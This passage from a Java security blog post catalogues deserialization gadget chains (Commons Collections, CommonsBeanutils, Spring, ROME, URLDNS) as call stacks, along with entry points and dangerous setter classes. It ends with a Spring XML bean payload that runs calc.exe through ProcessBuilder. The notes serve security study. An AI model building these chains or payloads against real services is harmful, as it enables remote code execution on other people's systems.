+<span class="hljs-symbol">readObject:</span><span class="hljs-number">444</span>, AnnotationInvocationHandler (sun.reflect.annotation)</code></pre></div>
+
+<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">newInstance:</span><span class="hljs-number">396</span>, Class (java.lang)
+<span class="hljs-symbol">getTransletInstance:</span><span class="hljs-number">455</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)
+<span class="hljs-symbol">newTransformer:</span><span class="hljs-number">486</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)
+&lt;init&gt;:<span class="hljs-number">64</span>, TrAXFilter (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)
+<span class="hljs-symbol">newInstance0:</span><span class="hljs-number">-1</span>, NativeConstructorAccessorImpl (sun.reflect)
+<span class="hljs-symbol">newInstance:</span><span class="hljs-number">62</span>, NativeConstructorAccessorImpl (sun.reflect)
+<span class="hljs-symbol">newInstance:</span><span class="hljs-number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)
+<span class="hljs-symbol">newInstance:</span><span class="hljs-number">422</span>, Constructor (java.lang.reflect)
+<span class="hljs-symbol">transform:</span><span class="hljs-number">116</span>, InstantiateTransformer (org.apache.commons.collections4.functors)
+<span class="hljs-symbol">transform:</span><span class="hljs-number">32</span>, InstantiateTransformer (org.apache.commons.collections4.functors)
+<span class="hljs-symbol">transform:</span><span class="hljs-number">112</span>, ChainedTransformer (org.apache.commons.collections4.functors)
+<span class="hljs-symbol">compare:</span><span class="hljs-number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)
+<span class="hljs-symbol">siftUpUsingComparator:</span><span class="hljs-number">669</span>, PriorityQueue (java.util)
+<span class="hljs-symbol">siftUp:</span><span class="hljs-number">645</span>, PriorityQueue (java.util)
+<span class="hljs-symbol">offer:</span><span class="hljs-number">344</span>, PriorityQueue (java.util)
+<span class="hljs-symbol">add:</span><span class="hljs-number">321</span>, PriorityQueue (java.util)</code></pre></div>
+
+<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span>:<span class="hljs-number">347</span>, Runtime (java.lang)
+<span class="hljs-attribute">invoke0</span>:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">497</span>, Method (java.lang.reflect)
+<span class="hljs-attribute">transform</span>:<span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)
+<span class="hljs-attribute">transform</span>:<span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)
+<span class="hljs-attribute">get</span>:<span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)
+<span class="hljs-attribute">getValue</span>:<span class="hljs-number">74</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)
+<span class="hljs-attribute">toString</span>:<span class="hljs-number">132</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)
+<span class="hljs-attribute">readObject</span>:<span class="hljs-number">86</span>, BadAttributeValueExpException (javax.management)</code></pre></div>
+
+<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>hashMap.hash()–&gt;TiedMapEntry.hashCode()</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span>:<span class="hljs-number">347</span>, Runtime (java.lang)
+<span class="hljs-attribute">invoke0</span>:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+<span class="hljs-attribute">invoke</span>:<span class="hljs-number">497</span>, Method (java.lang.reflect)
+<span class="hljs-attribute">transform</span>:<span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)
+<span class="hljs-attribute">transform</span>:<span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)
+<span class="hljs-attribute">get</span>:<span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)
+<span class="hljs-attribute">getValue</span>:<span class="hljs-number">74</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)
+<span class="hljs-attribute">hashCode</span>:<span class="hljs-number">121</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)
+<span class="hljs-attribute">hash</span>:<span class="hljs-number">338</span>, HashMap (java.util)
+<span class="hljs-attribute">readObject</span>:<span class="hljs-number">1397</span>, HashMap (java.util)</code></pre></div>
+
+<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>Hashtable.reconstitutionPut()–&gt;AbstractMapDecorator.equals()</p>
+<div class="code-wrapper"><pre><code class="hljs oxygene">exec:<span class="hljs-number">347</span>, Runtime (java.lang)
+invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">497</span>, <span class="hljs-keyword">Method</span> <span class="hljs-params">(java.lang.reflect)</span>
+<span class="hljs-title function_">transform</span>:<span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)
+transform:<span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)
+get:<span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)
+<span class="hljs-keyword">equals</span>:<span class="hljs-number">472</span>, AbstractMap (java.util)
+<span class="hljs-keyword">equals</span>:<span class="hljs-number">130</span>, AbstractMapDecorator (org.apache.commons.collections.map)
+reconstitutionPut:<span class="hljs-number">1221</span>, Hashtable (java.util)
+readObject:<span class="hljs-number">1195</span>, Hashtable (java.util)</code></pre></div>
+
+<h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">396</span>, Class (java.lang)
+getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)
+newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)
+getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)
+invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect) <span class="hljs-selector-attr">[2]</span>
+invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)
+invokeMethod:<span class="hljs-number">2116</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)
+getSimpleProperty:<span class="hljs-number">1267</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)
+getNestedProperty:<span class="hljs-number">808</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)
+getProperty:<span class="hljs-number">884</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)
+getProperty:<span class="hljs-number">464</span>, PropertyUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)
+compare:<span class="hljs-number">163</span>, BeanComparator (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)
+siftDownUsingComparator:<span class="hljs-number">721</span>, PriorityQueue (java.util)
+siftDown:<span class="hljs-number">687</span>, PriorityQueue (java.util)
+heapify:<span class="hljs-number">736</span>, PriorityQueue (java.util)
+readObject:<span class="hljs-number">795</span>, PriorityQueue (java.util)</code></pre></div>
+
+<h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">442</span>, Class (java.lang)
+getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)
+newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)
+invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)
+invoke:<span class="hljs-number">307</span>, AutowireUtils<span class="hljs-variable">$ObjectFactoryDelegatingInvocationHandler</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.beans</span><span class="hljs-selector-class">.factory</span>.support)
+newTransformer:-<span class="hljs-number">1</span>, <span class="hljs-variable">$Proxy10</span> (com<span class="hljs-selector-class">.sun</span>.proxy)
+invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)
+invokeMethod:<span class="hljs-number">202</span>, ReflectionUtils (org<span class="hljs-selector-class">.springframework</span>.util)
+invokeMethod:<span class="hljs-number">187</span>, ReflectionUtils (org<span class="hljs-selector-class">.springframework</span>.util)
+readObject:<span class="hljs-number">404</span>, SerializableTypeWrapper<span class="hljs-variable">$MethodInvokeTypeProvider</span> (org<span class="hljs-selector-class">.springframework</span>.core)</code></pre></div>
+
+<h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><p>HashMap.hash()–&gt;ObjectBean.hashCode()</p>
+<div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">396</span>, Class (java.lang)
+getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)
+newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)
+getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)
+invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect) <span class="hljs-selector-attr">[2]</span>
+toString:<span class="hljs-number">137</span>, ToStringBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)
+toString:<span class="hljs-number">116</span>, ToStringBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)
+toString:<span class="hljs-number">120</span>, ObjectBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)
+beanHashCode:<span class="hljs-number">193</span>, EqualsBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)
+hashCode:<span class="hljs-number">110</span>, ObjectBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)
+hash:<span class="hljs-number">338</span>, HashMap (java.util)
+readObject:<span class="hljs-number">1397</span>, HashMap (java.util)</code></pre></div>
+
+<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>HashMap.hash()–&gt;URL.hashCode()</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">getByName</span>:<span class="hljs-number">1076</span>, InetAddress (java.net)
+<span class="hljs-attribute">getHostAddress</span>:<span class="hljs-number">436</span>, URLStreamHandler (java.net)
+<span class="hljs-attribute">hashCode</span>:<span class="hljs-number">353</span>, URLStreamHandler (java.net)
+<span class="hljs-attribute">hashCode</span>:<span class="hljs-number">878</span>, URL (java.net)
+<span class="hljs-attribute">hash</span>:<span class="hljs-number">338</span>, HashMap (java.util)
+<span class="hljs-attribute">readObject</span>:<span class="hljs-number">1397</span>, HashMap (java.util)</code></pre></div>
+
+
+
+
+
+<h1 id="toString方法入口点"><a href="#toString方法入口点" class="headerlink" title="toString方法入口点"></a>toString方法入口点</h1><p>com.rometools.rome.feed.impl.ToStringBean#toString(java.lang.String)</p>
+<p>示例漏洞：CVE-2020-1948</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231214101909320.png" srcset="/img/loading.gif" lazyload></p>
+<p>com.alibaba.fastjson.JSON.toString()</p>
+<h1 id="hashCode方法入口点"><a href="#hashCode方法入口点" class="headerlink" title="hashCode方法入口点"></a>hashCode方法入口点</h1><h2 id="URLDNS-1"><a href="#URLDNS-1" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>java.net.URL.hashCode()</p>
+<h2 id="ROME-1"><a href="#ROME-1" class="headerlink" title="ROME"></a>ROME</h2><p>com.rometools.rome.feed.impl.ObjectBean.hashCode()</p>
+<h2 id="CC6-1"><a href="#CC6-1" class="headerlink" title="CC6"></a>CC6</h2><p>org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</p>
+<h2 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h2><p>com.rometools.rome.feed.impl.EqualsBean.hashCode()</p>
+<h1 id="equals方法入口点"><a href="#equals方法入口点" class="headerlink" title="equals方法入口点"></a>equals方法入口点</h1><p>org.springframework.aop.target.HotSwappableTargetSource.equals()</p>
+<p>com.sun.org.apache.xpath.internal.objects.XString.equals()</p>
+<h1 id="存在危险setter-getter方法的类"><a href="#存在危险setter-getter方法的类" class="headerlink" title="存在危险setter&#x2F;getter方法的类"></a>存在危险setter&#x2F;getter方法的类</h1><h2 id="JndiConverter"><a href="#JndiConverter" class="headerlink" title="JndiConverter"></a>JndiConverter</h2><p>全类名</p>
+<p>org.apache.xbean.propertyeditor.JndiConverter</p>
+<p>依赖</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div>
+
+<h3 id="setAsText"><a href="#setAsText" class="headerlink" title="setAsText"></a>setAsText</h3><p>org.apache.xbean.propertyeditor.JndiConverter#toObjectImpl</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213181256628.png" srcset="/img/loading.gif" lazyload> </p>
+<p>org.apache.xbean.propertyeditor.AbstractConverter#setAsText</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213181150542.png" srcset="/img/loading.gif" lazyload> </p>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>全类名</p>
+<p>com.sun.rowset.JdbcRowSetImpl</p>
+<p>依赖</p>
+<p>jdk内置</p>
+<p>com.sun.rowset.JdbcRowSetImpl#connect</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161437135.png" srcset="/img/loading.gif" lazyload> </p>
+<h3 id="getDatabaseMetaData"><a href="#getDatabaseMetaData" class="headerlink" title="getDatabaseMetaData"></a>getDatabaseMetaData</h3><p>com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161529181.png" srcset="/img/loading.gif" lazyload> </p>
+<h3 id="setAutoCommit"><a href="#setAutoCommit" class="headerlink" title="setAutoCommit"></a>setAutoCommit</h3><p>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161645365.png" srcset="/img/loading.gif" lazyload> </p>
+<h2 id="JSVGCanvas"><a href="#JSVGCanvas" class="headerlink" title="JSVGCanvas"></a>JSVGCanvas</h2><p>全类名</p>
+<p>org.apache.batik.swing.JSVGCanvas</p>
+<p>依赖</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xmlgraphics<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>batik-swing<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div>
+
+<h3 id="setURI"><a href="#setURI" class="headerlink" title="setURI"></a>setURI</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213182843785.png" srcset="/img/loading.gif" lazyload> </p>
+<h1 id="实例化对象过程中的利用链"><a href="#实例化对象过程中的利用链" class="headerlink" title="实例化对象过程中的利用链"></a>实例化对象过程中的利用链</h1><h2 id="ClassPathXmlApplicationContext"><a href="#ClassPathXmlApplicationContext" class="headerlink" title="ClassPathXmlApplicationContext"></a>ClassPathXmlApplicationContext</h2><p>全类名</p>
+<p>org.springframework.context.support.ClassPathXmlApplicationContext</p>
+<p>org.springframework.context.support.FileSystemXmlApplicationContext</p>
+<p>依赖</p>
+<p>xml</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc.exe<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E7%B1%BB%E5%8A%A0%E8%BD%BD/" title="类加载">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">类加载</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Python/Python%E7%88%AC%E8%99%AB/" title="Python爬虫">
+                        <span class="hidden-mobile">Python爬虫</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
